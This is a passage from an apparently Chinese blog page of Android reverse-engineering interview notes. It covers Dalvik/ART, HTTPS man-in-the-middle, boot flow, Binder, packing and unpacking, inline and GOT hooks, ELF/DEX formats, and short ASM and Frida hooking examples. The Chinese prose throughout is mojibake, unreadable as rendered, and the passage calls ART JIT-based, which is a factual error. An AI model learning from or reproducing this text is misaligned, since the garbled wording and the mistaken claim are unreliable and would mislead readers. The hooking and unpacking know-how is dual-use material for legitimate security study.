çš„ç±»åŠ è½½æœºåˆ¶é‡‡ç”¨åŒäº²å§”æ´¾æ¨¡å‹ã€‚å½“ä¸€ä¸ªç±»åŠ è½½å™¨éœ€è¦åŠ è½½ç±»æ—¶ï¼Œå®ƒä¼šå…ˆå§”æ‰˜çˆ¶ç±»åŠ è½½å™¨å°è¯•åŠ è½½è¯¥ç±»ã€‚å¦‚æœçˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»ï¼Œå­ç±»åŠ è½½å™¨æ‰ä¼šå°è¯•åŠ è½½ã€‚è¿™ç§æœºåˆ¶ç¡®ä¿äº† Java æ ¸å¿ƒç±»åº“çš„ç»Ÿä¸€æ€§ã€‚</p><h3 id="å®‰å“è™šæ‹Ÿæœºï¼ˆDalvik-å’Œ-ARTï¼‰ã€JIT-å’Œ-AOT"><a href="#å®‰å“è™šæ‹Ÿæœºï¼ˆDalvik-å’Œ-ARTï¼‰ã€JIT-å’Œ-AOT" class="headerlink" title="å®‰å“è™šæ‹Ÿæœºï¼ˆDalvik å’Œ ARTï¼‰ã€JIT å’Œ AOT"></a>å®‰å“è™šæ‹Ÿæœºï¼ˆDalvik å’Œ ARTï¼‰ã€JIT å’Œ AOT</h3><p><strong>Dalvik å’Œ ART</strong>ï¼š</p><ul><li><strong>Dalvik</strong>ï¼šAndroid æ—©æœŸä½¿ç”¨çš„è™šæ‹Ÿæœºï¼ŒåŸºäºå¯„å­˜å™¨çš„æ¶æ„ï¼Œä½¿ç”¨ Dalvik å­—èŠ‚ç ã€‚</li><li><strong>ART</strong>ï¼šAndroid 5.0 åŠä»¥ä¸Šç‰ˆæœ¬ä½¿ç”¨çš„è™šæ‹Ÿæœºï¼ŒåŸºäº JITï¼ˆJust-In-Timeï¼‰ç¼–è¯‘ï¼Œç›´æ¥å°†å­—èŠ‚ç ç¼–è¯‘ä¸ºæœºå™¨ç ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡ã€‚</li></ul><p><strong>JIT å’Œ AOT</strong>ï¼š</p><ul><li><strong>JITï¼ˆJust-In-Time Compilationï¼‰</strong>ï¼šåœ¨è¿è¡Œæ—¶å°†å­—èŠ‚ç ç¼–è¯‘ä¸ºæœºå™¨ç ï¼Œæé«˜æ‰§è¡Œæ•ˆç‡ã€‚</li><li><strong>AOTï¼ˆAhead-Of-Time Compilationï¼‰</strong>ï¼šåœ¨ç¼–è¯‘æ—¶å°†å­—èŠ‚ç ç¼–è¯‘ä¸ºæœºå™¨ç ï¼Œç”Ÿæˆå¯ç›´æ¥æ‰§è¡Œçš„æ–‡ä»¶ã€‚</li></ul><h3 id="HTTPS-è¯ä¹¦æ ¡éªŒï¼ˆå•å‘ã€åŒå‘æ ¡éªŒï¼‰ã€ä¸­é—´äººæ”»å‡»"><a href="#HTTPS-è¯ä¹¦æ ¡éªŒï¼ˆå•å‘ã€åŒå‘æ ¡éªŒï¼‰ã€ä¸­é—´äººæ”»å‡»" class="headerlink" title="HTTPS è¯ä¹¦æ ¡éªŒï¼ˆå•å‘ã€åŒå‘æ ¡éªŒï¼‰ã€ä¸­é—´äººæ”»å‡»"></a>HTTPS è¯ä¹¦æ ¡éªŒï¼ˆå•å‘ã€åŒå‘æ ¡éªŒï¼‰ã€ä¸­é—´äººæ”»å‡»</h3><p><strong>HTTPS è¯ä¹¦æ ¡éªŒ</strong>ï¼š</p><ul><li><strong>å•å‘æ ¡éªŒ</strong>ï¼šå®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨çš„è¯ä¹¦ï¼Œç¡®ä¿æœåŠ¡å™¨èº«ä»½çš„çœŸå®æ€§ã€‚</li><li><strong>åŒå‘æ ¡éªŒ</strong>ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨äº’ç›¸éªŒè¯å¯¹æ–¹çš„è¯ä¹¦ï¼Œç¡®ä¿åŒæ–¹èº«ä»½çš„çœŸå®æ€§ã€‚</li></ul><p><strong>ä¸­é—´äººæ”»å‡»</strong>ï¼š<br>ä¸­é—´äººæ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åœ¨é€šä¿¡åŒæ–¹ä¹‹é—´è¿›è¡Œæ‹¦æˆªå’Œç¯¡æ”¹æ•°æ®çš„æ”»å‡»æ–¹å¼ã€‚HTTPS é€šè¿‡è¯ä¹¦æ ¡éªŒå’ŒåŠ å¯†é€šä¿¡æ¥é˜²æ­¢ä¸­é—´äººæ”»å‡»ã€‚</p><h3 id="å®‰å“ç³»ç»Ÿå¯åŠ¨æµç¨‹ã€Zygote-å¯åŠ¨æµç¨‹ã€APP-å¯åŠ¨æµç¨‹"><a href="#å®‰å“ç³»ç»Ÿå¯åŠ¨æµç¨‹ã€Zygote-å¯åŠ¨æµç¨‹ã€APP-å¯åŠ¨æµç¨‹" class="headerlink" title="å®‰å“ç³»ç»Ÿå¯åŠ¨æµç¨‹ã€Zygote å¯åŠ¨æµç¨‹ã€APP å¯åŠ¨æµç¨‹"></a>å®‰å“ç³»ç»Ÿå¯åŠ¨æµç¨‹ã€Zygote å¯åŠ¨æµç¨‹ã€APP å¯åŠ¨æµç¨‹</h3><p><strong>å®‰å“ç³»ç»Ÿå¯åŠ¨æµç¨‹</strong>ï¼š</p><ol><li><strong>BootROM</strong>ï¼šåˆå§‹åŒ–ç¡¬ä»¶ï¼ŒåŠ è½½ Bootloaderã€‚</li><li><strong>Bootloader</strong>ï¼šåŠ è½½å†…æ ¸ã€‚</li><li><strong>å†…æ ¸</strong>ï¼šåˆå§‹åŒ–ç³»ç»Ÿï¼ŒåŠ è½½ init è¿›ç¨‹ã€‚</li><li><strong>init è¿›ç¨‹</strong>ï¼šè§£æé…ç½®æ–‡ä»¶ï¼Œå¯åŠ¨ç³»ç»ŸæœåŠ¡ã€‚</li></ol><p><strong>Zygote å¯åŠ¨æµç¨‹</strong>ï¼š</p><ol><li><strong>å¯åŠ¨ Zygote è¿›ç¨‹</strong>ï¼šç”± init è¿›ç¨‹å¯åŠ¨ï¼ŒåŠ è½½ Android ç³»ç»Ÿçš„æ ¸å¿ƒåº“å’Œèµ„æºã€‚</li><li><strong>é¢„åŠ è½½èµ„æº</strong>ï¼šåŠ è½½å¸¸ç”¨çš„ç±»å’Œèµ„æºï¼Œæé«˜åº”ç”¨å¯åŠ¨é€Ÿåº¦ã€‚</li><li><strong>åˆ›å»ºå­è¿›ç¨‹</strong>ï¼šé€šè¿‡ fork åˆ›å»ºå­è¿›ç¨‹ï¼Œå¯åŠ¨åº”ç”¨ç¨‹åºã€‚</li></ol><p><strong>APP å¯åŠ¨æµç¨‹</strong>ï¼š</p><ol><li><strong>å¯åŠ¨ Activity</strong>ï¼šé€šè¿‡ Intent å¯åŠ¨ Activityã€‚</li><li><strong>åŠ è½½èµ„æº</strong>ï¼šåŠ è½½å¸ƒå±€æ–‡ä»¶å’Œèµ„æºã€‚</li><li><strong>åˆå§‹åŒ–ç»„ä»¶</strong>ï¼šåˆå§‹åŒ– Viewã€Service ç­‰ç»„ä»¶ã€‚</li><li><strong>å¯åŠ¨æœåŠ¡</strong>ï¼šå¯åŠ¨åå°æœåŠ¡ï¼Œå¦‚ç½‘ç»œè¯·æ±‚ã€æ•°æ®å¤„ç†ç­‰ã€‚</li></ol><h3 id="Activity-å’Œ-Service-çš„ç”Ÿå‘½å‘¨æœŸã€Binder-é€šä¿¡æœºåˆ¶"><a href="#Activity-å’Œ-Service-çš„ç”Ÿå‘½å‘¨æœŸã€Binder-é€šä¿¡æœºåˆ¶" class="headerlink" title="Activity å’Œ Service çš„ç”Ÿå‘½å‘¨æœŸã€Binder é€šä¿¡æœºåˆ¶"></a>Activity å’Œ Service çš„ç”Ÿå‘½å‘¨æœŸã€Binder é€šä¿¡æœºåˆ¶</h3><p><strong>Activity ç”Ÿå‘½å‘¨æœŸ</strong>ï¼š</p><ul><li>**onCreate()**ï¼šåˆ›å»º Activityã€‚</li><li>**onStart()**ï¼šActivity å˜ä¸ºå¯è§ã€‚</li><li>**onResume()**ï¼šActivity å¼€å§‹ä¸ç”¨æˆ·äº¤äº’ã€‚</li><li>**onPause()**ï¼šActivity å³å°†å¤±å»ç„¦ç‚¹ã€‚</li><li>**onStop()**ï¼šActivity ä¸å†å¯è§ã€‚</li><li>**onDestroy()**ï¼šé”€æ¯ Activityã€‚</li></ul><p><strong>Service ç”Ÿå‘½å‘¨æœŸ</strong>ï¼š</p><ul><li>**onCreate()**ï¼šåˆ›å»º Serviceã€‚</li><li>**onStartCommand()**ï¼šå¯åŠ¨ Serviceã€‚</li><li>**onBind()**ï¼šç»‘å®š Serviceã€‚</li><li>**onDestroy()**ï¼šé”€æ¯ Serviceã€‚</li></ul><p><strong>Binder é€šä¿¡æœºåˆ¶</strong>ï¼š<br>Binder æ˜¯ Android ç³»ç»Ÿä¸­ç”¨äºè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰çš„æœºåˆ¶ã€‚é€šè¿‡ Binderï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥è°ƒç”¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸­çš„å¯¹è±¡æ–¹æ³•ï¼Œå®ç°è·¨è¿›ç¨‹çš„é€šä¿¡ã€‚Binder æœºåˆ¶åŒ…æ‹¬ï¼š</p><ul><li><strong>Binder é©±åŠ¨</strong>ï¼šå†…æ ¸æ¨¡å—ï¼Œè´Ÿè´£è¿›ç¨‹é—´çš„æ•°æ®ä¼ é€’ã€‚</li><li><strong>Binder Proxy</strong>ï¼šå®¢æˆ·ç«¯çš„ä»£ç†å¯¹è±¡ï¼Œç”¨äºä¸æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ã€‚</li><li><strong>Binder Stub</strong>ï¼šæœåŠ¡ç«¯çš„æ¡©å¯¹è±¡ï¼Œç”¨äºæ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶è°ƒç”¨æœåŠ¡ç«¯çš„æ–¹æ³•ã€‚</li></ul><h2 id="Javaå±‚å’ŒSOå±‚æ˜¯æ€ä¹ˆhookçš„"><a href="#Javaå±‚å’ŒSOå±‚æ˜¯æ€ä¹ˆhookçš„" class="headerlink" title="Javaå±‚å’ŒSOå±‚æ˜¯æ€ä¹ˆhookçš„"></a>Javaå±‚å’ŒSOå±‚æ˜¯æ€ä¹ˆhookçš„</h2><p>åœ¨Androidåº”ç”¨ä¸­ï¼ŒJavaå±‚å’ŒSOå±‚çš„HookæŠ€æœ¯æ˜¯å®ç°åŠ¨æ€ä¿®æ”¹ç¨‹åºè¡Œä¸ºçš„å¸¸ç”¨æ‰‹æ®µã€‚ä»¥ä¸‹åˆ†åˆ«ä»‹ç»è¿™ä¸¤ç§å±‚çš„Hookæ–¹æ³•åŠå…¶åŸç†ï¼š</p><h3 id="Javaå±‚Hook"><a href="#Javaå±‚Hook" class="headerlink" title="Javaå±‚Hook"></a>Javaå±‚Hook</h3><p>Javaå±‚çš„Hookä¸»è¦é€šè¿‡ä¿®æ”¹å­—èŠ‚ç æˆ–åˆ©ç”¨Javaçš„åå°„æœºåˆ¶æ¥å®ç°ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•ï¼š</p><h4 id="ä½¿ç”¨ASMæ¡†æ¶"><a href="#ä½¿ç”¨ASMæ¡†æ¶" class="headerlink" title="ä½¿ç”¨ASMæ¡†æ¶"></a>ä½¿ç”¨ASMæ¡†æ¶</h4><p>ASMæ˜¯ä¸€ä¸ªç”¨äºæ“ä½œJavaå­—èŠ‚ç çš„æ¡†æ¶ã€‚é€šè¿‡ASMï¼Œå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€ä¿®æ”¹ç±»çš„å­—èŠ‚ç ï¼Œä»è€Œå®ç°Hookã€‚</p><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookExample</span> <span class="keyword">implements</span> <span class="title class_">Opcodes</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hookClass(<span class="type">byte</span>[] classBytes) &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(classBytes);</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">cw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        cr.accept(<span class="keyword">new</span> <span class="title class_">HookClassVisitor</span>(cw), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HookClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">HookClassVisitor</span><span class="params">(ClassVisitor cv)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(ASM5, cv);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">            <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;methodToHook&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HookMethodVisitor</span>(mv);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> mv;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HookMethodVisitor</span> <span class="keyword">extends</span> <span class="title class_">MethodVisitor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">HookMethodVisitor</span><span class="params">(MethodVisitor mv)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(ASM5, mv);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitInsn</span><span class="params">(<span class="type">int</span> opcode)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (opcode &gt;= IRETURN &amp;&amp; opcode &lt;= RETURN) &#123;</span><br><span class="line">                <span class="comment">// åœ¨æ–¹æ³•è¿”å›ä¹‹å‰æ’å…¥Hookä»£ç </span></span><br><span class="line">                mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">                mv.visitLdcInsn(<span class="string">&quot;Hooked!&quot;</span>);</span><br><span class="line">                mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">super</span>.visitInsn(opcode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SOå±‚Hook"><a href="#SOå±‚Hook" class="headerlink" title="SOå±‚Hook"></a>SOå±‚Hook</h3><p>SOå±‚çš„Hooké€šå¸¸ä½¿ç”¨åŠ¨æ€åº“æ‹¦æˆªæŠ€æœ¯ï¼Œå¦‚LD_PRELOADæˆ–ä½¿ç”¨Fridaç­‰å·¥å…·ã€‚</p><h4 id="ä½¿ç”¨Frida"><a href="#ä½¿ç”¨Frida" class="headerlink" title="ä½¿ç”¨Frida"></a>ä½¿ç”¨Frida</h4><p>Fridaå¯ä»¥é€šè¿‡æ³¨å…¥è„šæœ¬åˆ°ç›®æ ‡è¿›ç¨‹ä¸­ï¼ŒåŠ¨æ€Hookå‡½æ•°ã€‚</p><p><strong>ç¤ºä¾‹ä»£ç </strong>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fridaè„šæœ¬ç¤ºä¾‹</span></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libexample.so&quot;</span>, <span class="string">&quot;functionToHook&quot;</span>), &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hooked functionToHook&quot;</span>);</span><br><span class="line">        <span class="comment">// ä¿®æ”¹å‚æ•°æˆ–è¿”å›å€¼</span></span><br><span class="line">        args[<span class="number">0</span>] = <span class="title function_">ptr</span>(<span class="number">0x12345678</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Fridaçš„åŸç†"><a href="#Fridaçš„åŸç†" class="headerlink" title="Fridaçš„åŸç†"></a>Fridaçš„åŸç†</h2><p>Fridaæ˜¯ä¸€ç§åŠ¨æ€ä»ªå™¨æ¡†æ¶ï¼Œå®ƒå…è®¸ä½ åœ¨è¿è¡Œæ—¶å°†è„šæœ¬æ³¨å…¥åˆ°æœ¬åœ°å’Œè¿œç¨‹åº”ç”¨ç¨‹åºä¸­ã€‚å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><ol><li><strong>æ³¨å…¥è„šæœ¬</strong>ï¼šFridaé€šè¿‡ptraceç³»ç»Ÿè°ƒç”¨é™„åŠ åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œå°†è„šæœ¬æ³¨å…¥åˆ°è¿›ç¨‹ä¸­ã€‚</li><li><strong>æ‹¦æˆªå‡½æ•°</strong>ï¼šä½¿ç”¨åŠ¨æ€é“¾æ¥åº“å’Œå‡½æ•°æ‹¦æˆªæŠ€æœ¯ï¼ŒFridaå¯ä»¥åœ¨ç›®æ ‡è¿›ç¨‹ä¸­HookæŒ‡å®šçš„å‡½æ•°ã€‚</li><li><strong>é€šä¿¡æœºåˆ¶</strong>ï¼šFridaæä¾›äº†ä¸€ä¸ªAPIï¼Œå…è®¸æ³¨å…¥çš„è„šæœ¬ä¸å¤–éƒ¨å·¥å…·è¿›è¡Œé€šä¿¡ï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡è¿›ç¨‹çš„æ§åˆ¶å’Œæ•°æ®æ”¶é›†ã€‚</li></ol><h2 id="åŠ å£³è„±å£³åŸç†"><a href="#åŠ å£³è„±å£³åŸç†" class="headerlink" title="åŠ å£³è„±å£³åŸç†"></a>åŠ å£³è„±å£³åŸç†</h2><p>åŠ å£³å’Œè„±å£³æ˜¯Androidåº”ç”¨å®‰å…¨ä¸­çš„é‡è¦æŠ€æœ¯ã€‚åŠ å£³çš„ç›®çš„æ˜¯ä¿æŠ¤åº”ç”¨ä¸è¢«åç¼–è¯‘å’Œç¯¡æ”¹ï¼Œè€Œè„±å£³åˆ™æ˜¯ä¸ºäº†åˆ†æå’Œä¿®æ”¹åŠ å£³åçš„åº”ç”¨ã€‚</p><h3 id="åŠ å£³åŸç†"><a href="#åŠ å£³åŸç†" class="headerlink" title="åŠ å£³åŸç†"></a>åŠ å£³åŸç†</h3><p>åŠ å£³é€šå¸¸é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ï¼š</p><ol><li><strong>åŠ å¯†DEXæ–‡ä»¶</strong>ï¼šå°†åº”ç”¨çš„DEXæ–‡ä»¶åŠ å¯†ï¼Œé˜²æ­¢ç›´æ¥åç¼–è¯‘ã€‚</li><li><strong>è‡ªå®šä¹‰åŠ è½½å™¨</strong>ï¼šç¼–å†™ä¸€ä¸ªè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ï¼Œåœ¨åº”ç”¨å¯åŠ¨æ—¶è§£å¯†å¹¶åŠ è½½DEXæ–‡ä»¶ã€‚</li><li><strong>æ‰“åŒ…ä¸ºSOæ–‡ä»¶</strong>ï¼šå°†åŠ å¯†çš„DEXæ–‡ä»¶å’ŒåŠ è½½å™¨æ‰“åŒ…ä¸ºSOæ–‡ä»¶ï¼Œå¢åŠ åç¼–è¯‘çš„éš¾åº¦ã€‚</li></ol><h3 id="è„±å£³åŸç†"><a href="#è„±å£³åŸç†" class="headerlink" title="è„±å£³åŸç†"></a>è„±å£³åŸç†</h3><p>è„±å£³çš„è¿‡ç¨‹é€šå¸¸åŒ…æ‹¬ï¼š</p><ol><li><strong>æå–åŠ å¯†çš„DEXæ–‡ä»¶</strong>ï¼šä»åŠ å£³åçš„APKä¸­æå–åŠ å¯†çš„DEXæ–‡ä»¶ã€‚</li><li><strong>è·å–è§£å¯†å¯†é’¥</strong>ï¼šé€šè¿‡é€†å‘å·¥ç¨‹æ‰¾åˆ°è§£å¯†å¯†é’¥æˆ–è§£å¯†ç®—æ³•ã€‚</li><li><strong>è§£å¯†DEXæ–‡ä»¶</strong>ï¼šä½¿ç”¨è§£å¯†å¯†é’¥æˆ–ç®—æ³•è§£å¯†DEXæ–‡ä»¶ï¼Œå¾—åˆ°åŸå§‹çš„DEXæ–‡ä»¶ã€‚</li></ol><h2 id="Inline-Hookäº†è§£å—-ç®€è¦è¯´è¯´-Got-hookå‘¢-è¯´ä¸‹åŸç†"><a href="#Inline-Hookäº†è§£å—-ç®€è¦è¯´è¯´-Got-hookå‘¢-è¯´ä¸‹åŸç†" class="headerlink" title="Inline Hookäº†è§£å—?ç®€è¦è¯´è¯´, Got hookå‘¢?è¯´ä¸‹åŸç†"></a>Inline Hookäº†è§£å—?ç®€è¦è¯´è¯´, Got hookå‘¢?è¯´ä¸‹åŸç†</h2><h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>Inline Hookæ˜¯ä¸€ç§å‡½æ•°HookæŠ€æœ¯ï¼Œé€šè¿‡ä¿®æ”¹ç›®æ ‡å‡½æ•°çš„å¼€å¤´éƒ¨åˆ†æŒ‡ä»¤ï¼Œè·³è½¬åˆ°Hookå‡½æ•°ï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡å‡½æ•°çš„æ‹¦æˆªå’Œä¿®æ”¹ã€‚</p><h3 id="GOT-Hook"><a href="#GOT-Hook" class="headerlink" title="GOT Hook"></a>GOT Hook</h3><p>GOTï¼ˆGlobal Offset Tableï¼‰Hookæ˜¯åˆ©ç”¨åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸­çš„GOTè¡¨è¿›è¡ŒHookã€‚GOTè¡¨å­˜å‚¨äº†åŠ¨æ€é“¾æ¥åº“ä¸­å‡½æ•°çš„åœ°å€ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œé€šè¿‡ä¿®æ”¹GOTè¡¨ä¸­çš„åœ°å€ï¼Œå¯ä»¥å°†å¯¹åŸå‡½æ•°çš„è°ƒç”¨é‡å®šå‘åˆ°Hookå‡½æ•°ã€‚</p><h2 id="ç¬¬ä¸‰ä»£åŠ å£³dex2cå’Œvmpèƒ½æ‰‹åŠ¨è„±å£³å—-è¯´ä¸‹è„±å£³ç»†èŠ‚"><a href="#ç¬¬ä¸‰ä»£åŠ å£³dex2cå’Œvmpèƒ½æ‰‹åŠ¨è„±å£³å—-è¯´ä¸‹è„±å£³ç»†èŠ‚" class="headerlink" title="ç¬¬ä¸‰ä»£åŠ å£³dex2cå’Œvmpèƒ½æ‰‹åŠ¨è„±å£³å—?è¯´ä¸‹è„±å£³ç»†èŠ‚"></a>ç¬¬ä¸‰ä»£åŠ å£³dex2cå’Œvmpèƒ½æ‰‹åŠ¨è„±å£³å—?è¯´ä¸‹è„±å£³ç»†èŠ‚</h2><p>ç¬¬ä¸‰ä»£åŠ å£³æŠ€æœ¯å¦‚DEX2Cå’ŒVMPï¼Œé€šè¿‡å°†DEXå­—èŠ‚ç è½¬æ¢ä¸ºCä»£ç æˆ–ä½¿ç”¨è™šæ‹Ÿæœºä¿æŠ¤ï¼Œå¢åŠ äº†è„±å£³çš„éš¾åº¦ã€‚æ‰‹åŠ¨è„±å£³é€šå¸¸éœ€è¦ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><strong>åˆ†æåŠ å£³ç¨‹åº</strong>ï¼šä½¿ç”¨åç¼–è¯‘å·¥å…·å¦‚IDA Proæˆ–Ghidraåˆ†æåŠ å£³åçš„ç¨‹åºï¼Œäº†è§£å…¶åŠ å¯†å’ŒåŠ è½½é€»è¾‘ã€‚</li><li><strong>æå–åŠ å¯†æ•°æ®</strong>ï¼šä»åŠ å£³ç¨‹åºä¸­æå–åŠ å¯†çš„DEXæ•°æ®æˆ–å…¶ä»–å…³é”®æ•°æ®ã€‚</li><li><strong>é€†å‘åŠ å¯†ç®—æ³•</strong>ï¼šé€šè¿‡é€†å‘å·¥ç¨‹è¿˜åŸåŠ å¯†ç®—æ³•ï¼Œç¼–å†™è§£å¯†è„šæœ¬ã€‚</li><li><strong>æ¨¡æ‹Ÿè¿è¡Œç¯å¢ƒ</strong>ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦æ¨¡æ‹ŸåŠ å£³ç¨‹åºçš„è¿è¡Œç¯å¢ƒï¼Œä»¥æ­£ç¡®è§£å¯†å’ŒåŠ è½½DEXæ–‡ä»¶ã€‚</li></ol><h2 id="è¯´ä¸‹elfæ–‡ä»¶å’Œdexæ–‡ä»¶"><a href="#è¯´ä¸‹elfæ–‡ä»¶å’Œdexæ–‡ä»¶" class="headerlink" title="è¯´ä¸‹elfæ–‡ä»¶å’Œdexæ–‡ä»¶"></a>è¯´ä¸‹elfæ–‡ä»¶å’Œdexæ–‡ä»¶</h2><h3 id="ELFæ–‡ä»¶"><a href="#ELFæ–‡ä»¶" class="headerlink" title="ELFæ–‡ä»¶"></a>ELFæ–‡ä»¶</h3><p>ELFï¼ˆExecutable and Linkable Formatï¼‰æ˜¯Unix&#x2F;Linuxç³»ç»Ÿä¸­å¯æ‰§è¡Œæ–‡ä»¶ã€ç›®æ ‡æ–‡ä»¶å’Œå…±äº«åº“çš„æ–‡ä»¶æ ¼å¼ã€‚ELFæ–‡ä»¶åŒ…å«ç¨‹åºè¿è¡Œæ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»£ç æ®µã€æ•°æ®æ®µã€å¤´éƒ¨ä¿¡æ¯ç­‰ã€‚</p><h3 id="DEXæ–‡ä»¶"><a href="#DEXæ–‡ä»¶" class="headerlink" title="DEXæ–‡ä»¶"></a>DEXæ–‡ä»¶</h3><p>DEXï¼ˆDalvik EXecutableï¼‰æ˜¯Androidå¹³å°ä¸Šçš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ï¼Œç”¨äºå­˜å‚¨Dalvikè™šæ‹Ÿæœºçš„å­—èŠ‚ç ã€‚DEXæ–‡ä»¶åŒ…å«ç±»ã€æ–¹æ³•ã€å­—æ®µç­‰ä¿¡æ¯ï¼Œæ˜¯Androidåº”ç”¨çš„æ ¸å¿ƒç»„æˆéƒ¨åˆ†ã€‚</p><h2 id="Fridaæ˜¯åŸºäºptraceå‡½æ•°æ³¨å…¥çš„-èƒ½è¯´ä¸‹ptraceè¿™ä¸ªå‡½æ•°å—"><a href="#Fridaæ˜¯åŸºäºptraceå‡½æ•°æ³¨å…¥çš„-èƒ½è¯´ä¸‹ptraceè¿™ä¸ªå‡½æ•°å—" class="headerlink" 